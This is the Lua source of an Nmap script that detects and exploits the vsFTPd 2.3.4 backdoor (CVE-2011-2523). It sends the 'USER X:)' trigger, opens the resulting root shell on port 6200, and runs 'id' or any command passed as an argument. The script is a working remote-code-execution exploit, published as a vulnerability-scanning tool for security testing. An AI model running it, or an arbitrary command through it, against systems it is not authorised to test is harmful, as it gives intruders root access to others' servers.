local ftp = require "ftp"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local vulns = require "vulns"

description = [[
Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04
(CVE-2011-2523). This script attempts to exploit the backdoor using the
innocuous <code>id</code> command by default, but that can be changed with
the <code>exploit.cmd</code> or <code>ftp-vsftpd-backdoor.cmd</code> script
arguments.

References:
 * http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
 * https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13093
 * http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2011-2523
]]

---
-- @usage
-- nmap --script ftp-vsftpd-backdoor -p 21 <host>
--
-- @args exploit.cmd or ftp-vsftpd-backdoor.cmd Command to execute in shell
--       (default is <code>id</code>).
--
-- @output
-- PORT   STATE SERVICE
-- 21/tcp open  ftp
-- | ftp-vsftpd-backdoor: 
-- |   VULNERABLE:
-- |   vsFTPd version 2.3.4 backdoor
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2011-2523  OSVDB:73573
-- |     Description:
-- |       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
-- |     Disclosure date: 2011-07-03
-- |     Exploit results:
-- |       The backdoor was already triggered
-- |       Shell command: id
-- |       Results: uid=0(root) gid=0(root) groups=0(root)
-- |     References:
-- |       http://osvdb.org/73573
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
-- |       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
-- |_      https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13093
--

author = "Daniel Miller"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive", "malware", "vuln"}


local CMD_FTP = "USER X:)\r\nPASS X\r\n"
local CMD_SHELL_ID = "id"

portrule = function (host, port)
  -- Check if version detection knows what FTP server this is.
  if port.version.product ~= nil and port.version.product ~= "vsftpd" then
    return false
  end

  -- Check if version detection knows what version of FTP server this is.
  if port.version.version ~= nil and port.version.version ~= "2.3.4" then
    return false
  end

  return shortport.port_or_service(21, "ftp")(host, port)
end

local function finish_ftp(socket, status, message)
  if socket then
    socket:close()
  end
  return status, message
end

-- Returns true, results  if vsFTPd was backdoored
local function check_backdoor(host, shell_cmd, vuln)
  local socket = nmap.new_socket("tcp")
  socket:set_timeout(10000)
  
  local status, ret = socket:connect(host, 6200, "tcp")
  if not status then
    stdnse.print_debug(3, "%s: can't connect to tcp port 6200: NOT VULNERABLE",
        SCRIPT_NAME)
    vuln.state = vulns.STATE.NOT_VULN
    return finish_ftp(socket, true)
  end

  status, ret = socket:send(CMD_SHELL_ID.."\n")
  if not status then
    return finish_ftp(socket, false, "failed to send shell command")
  end

  status, ret = socket:receive_lines(1)
  if not status then
    return finish_ftp(socket, false,
              string.format("failed to read shell command results: %s",
                            ret))
  end

  if not ret:match("uid=") then
    stdnse.print_debug(3,
        "%s: service on port 6200 is not the vsFTPd backdoor: NOT VULNERABLE",
        SCRIPT_NAME)
    vuln.state = vulns.STATE.NOT_VULN
    return finish_ftp(socket, true)
  else
    if shell_cmd ~= CMD_SHELL_ID then
      status, ret = socket:send(shell_cmd.."\n")
      if not status then
        return finish_ftp(socket, false, "failed to send shell command")
      end
      status, ret = socket:receive_lines(1)
      if not status then
        return finish_ftp(socket, false,
                  string.format("failed to read shell commands results: %s",
                                ret))
      end
    else
      socket:send("exit\n");
    end
  end
 
  vuln.state = vulns.STATE.EXPLOIT
  table.insert(vuln.exploit_results,
      string.format("Shell command: %s", shell_cmd))
  local result = string.gsub(ret, "^%s*(.-)\n*$", "%1")
  table.insert(vuln.exploit_results,
      string.format("Results: %s", result))

  return finish_ftp(socket, true) 
end

action = function(host, port)
  -- Get script arguments.
  local cmd = stdnse.get_script_args("ftp-vsftpd-backdoor.cmd") or
                stdnse.get_script_args("exploit.cmd") or CMD_SHELL_ID

  local vsftp_vuln = {
    title = "vsFTPd version 2.3.4 backdoor",
    IDS = {CVE = 'CVE-2011-2523', OSVDB = '73573'},
    description = [[
vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.]],
    references = {
'http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html',
'https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13093',
    },
    dates = {
      disclosure = {year = '2011', month = '07', day = '03'},
    },
    exploit_results = {},
  }
  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  -- check to see if the vsFTPd backdoor was already triggered
  local status, ret = check_backdoor(host, cmd, vsftp_vuln)
  if status then
    return report:make_output(vsftp_vuln)
  end

  -- Create socket.
  local sock, err = ftp.connect(host, port,
                                {recv_before = false,
                                timeout = 8000})
  if not sock then
    stdnse.print_debug(1, "%s: can't connect: %s",
                          SCRIPT_NAME, err)
    return nil
  end

  -- Read banner.
  local buffer = stdnse.make_buffer(sock, "\r?\n")
  local code, message = ftp.read_reply(buffer)
  if not code then
    stdnse.print_debug(1, "%s: can't read banner: %s",
                          SCRIPT_NAME, message)
    sock:close()
    return nil
  end

  status, ret = sock:send(CMD_FTP .. "\r\n")
  if not status then
    stdnse.print_debug(1, "%s: failed to send privilege escalation command: %s",
                          SCRIPT_NAME, ret)
    return nil
  end

  stdnse.sleep(1)
  -- check if vsFTPd was backdoored
  status, ret = check_backdoor(host, cmd, vsftp_vuln)
  if not status then
    stdnse.print_debug(1, "%s: %s", SCRIPT_NAME, ret)
    return nil
  end

  -- delay ftp socket cleaning
  sock:close()
  return report:make_output(vsftp_vuln)
end
